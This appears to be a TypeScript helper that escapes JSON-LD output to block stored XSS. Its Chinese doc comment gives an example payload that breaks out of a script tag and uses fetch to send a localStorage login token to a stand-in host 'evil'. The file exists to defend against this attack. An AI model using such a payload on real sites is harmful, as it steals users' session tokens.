/**
 * 把任意对象序列化为可安全嵌入 <script type="application/ld+json"> 的字符串。
 *
 * 安全不变量 INV-FE-001（见 SECURITY.md）：
 * 所有 dangerouslySetInnerHTML={{__html: JSON.stringify(jsonLd)}} 必须改用本函数。
 *
 * 攻击场景：用户在可控字段（bio / displayName 等 user-generated 字段）填入
 *   </script><script>fetch("https://evil/?t="+localStorage.getItem("satoken"))</script>
 * JSON.stringify 默认不转义 `<`，攻击者文本作为合法 JSON 字符串嵌入 <script> 块时，
 * 浏览器仍先看到 </script> 闭合 script 块，接着把后续 <script> 当 inline JS 执行
 * —— 典型 stored XSS。
 *
 * 阻断思路：把 JSON.stringify 输出中所有可能闭合 script 的字符替换成 \\uXXXX 字面 6 字符。
 * 浏览器 HTML 解析器看不到 `<` 自然不会闭合 script；JSON.parse 仍能识别 \\u 转义还原。
 *
 * 同时转义 U+2028 / U+2029（行分隔符）：JSON 内部合法，但若整段文本被误嵌入
 * ECMAScript 源码上下文会被识别为行终止符破坏外层 JS 语法——defense-in-depth。
 */
export function safeJsonLdString(payload: unknown): string {
  let serialized: string | undefined;

  try {
    serialized = JSON.stringify(payload);
  } catch {
    serialized = "null";
  }

  return (serialized ?? "null")
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029");
}
